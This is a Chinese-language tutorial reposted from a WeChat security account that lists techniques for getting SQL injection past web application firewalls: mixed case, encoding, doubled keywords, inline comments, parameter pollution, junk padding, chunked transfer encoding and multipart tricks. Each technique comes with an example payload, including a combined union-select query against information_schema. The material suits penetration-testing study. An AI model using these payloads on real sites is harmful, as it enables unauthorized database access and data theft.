> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/AqTwUecnRmCVmX9XShEyJg)

> WAF拦截原理：WAF从规则库中匹配敏感字符进行拦截。

关键词大小写绕过
--------

有的WAF因为规则设计的问题，只匹配纯大写或纯小写的字符，对字符大小写混写直接无视，这时，我们可以利用这一点来进行绕过

举列：union select ---> unIOn SeLEcT

编码绕过
----

针对WAF过滤的字符编码，如使用URL编码，Unicode编码，十六进制编码，Hex编码等.

举列：union select 1,2,3# =union%0aselect 1\u002c2,3%23

双写绕过
----

部分WAF只对字符串识别一次，删除敏感字段并拼接剩余语句，这时，我们可以通过双写来进行绕过。

举列：UNIunionON ，SELselectECT anandd

换行(\N)绕过
--------

举列：select * from admin where username = \N union select 1,user() from admin

注释符内联注释绕过：
----------

/_XXX_/，#, -- -，--+, ;  
union selecte =/_!union_/ select

同义词替换
-----

and=&&  
or=||  
=(等于号)=<、>  
空格不能使用=%09,%0a,%0b,%0c,%0d,%20,%a0等  
注：%0a是换行也可以替代空格

HTTP参污染
-------

对目标发送多个参数，如果目标没有多参数进行多次过滤，那么WAF对多个参数只会识别其中的一个。

举列：?id=1&id=2&id=3

垃圾参数
----

WAF在设计的时候都会考虑到性能问题，检测数据包的包长或检测数据流长度，有一个限制。因此在设计WAF的时候可能就有一个默认值，默认多少个字节的流大小，或是多少个数据包。此时可以向HTTP POST添加填充数据，达到一定数目之后，POST中的sql注入恶意代码没有被检测了，达到了bypass的目的。

POST请求:  
举列：a=AAAAAA*[很多个A] &id=1 order by X[1-3]

组合绕过
----

将以上所学习的知识点结合在一起，这样能大幅提高绕过WAF的可能性

举列：id=1/_!UnIoN_/+SeLeCT+1,2,concat(/_!table_name_/)+FrOM /_!information_schema_/.tables /_!WHERE _/+/_!TaBlE_ScHeMa_/+like+database()– -

分块传输
----

在burp中关闭自动补全，删掉Content-Length: 37，添加Tranfer-Enconding: chunked就代表是分块传输了，下面字符依次类推，注意结束时有两个空行。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

如果这样依旧被拦截可以在每分块后面加上；注释，尝试绕过

```
2;CESHI  
id  
2;CESHI  
=1  
5;CESHI  
order  
2;CESHI  
by  
1;CESHI  
4  

```

协议未覆盖
-----

将头部Content-Type改为multipart/form-data; boundary=69 然后设置分割符内的Content-Disposition的name为要传参数的名称。数据部分则放在分割结束符上一行，可以直接使用Burp中的change body encoding来更改数据格式，进行绕过

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

总结

> WAF绕过的思路就是让WAF的检测规则，识别不到你所输入的敏感字符，利用上述我所介绍的知识点，灵活结合各种方法，从而可以增加绕过WAF的可能性。

作者：西瓜，转载于：xffbk.cn，各位可关注作者博客。
-----------------------------

**END**

* * *

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

●[干货|渗透学习资料大集合（书籍、工具、技术文档、视频教程）](http://mp.weixin.qq.com/s?__biz=MzIwMzIyMjYzNA==&mid=2247490635&idx=1&sn=c3b32cbf3e833a427b1fbf6db0605084&chksm=96d3e74ea1a46e58d76d9f901ea1754ae2944e199e4970255e69df4443f4dc9603afa167a6c6&scene=21#wechat_redirect)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

 ![HACK之道](http://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1orFibqtmBJd06F33KoWTM6qEUAG7ZbwicA5MhTqx9stelHv8cMgibthiahUBTtgbPgn3ia2bYLpBElTQ/0?wx_fmt=png) ** HACK之道 ** HACK之道，专注于红队攻防、实战技巧、CTF比赛、安全开发、安全运维、安全架构等精华技术文章及渗透教程、安全工具的分享。 7篇原创内容   公众号

**点击上方，关注公众号**

**如文章对你有帮助，请支持点下“赞”“在看”**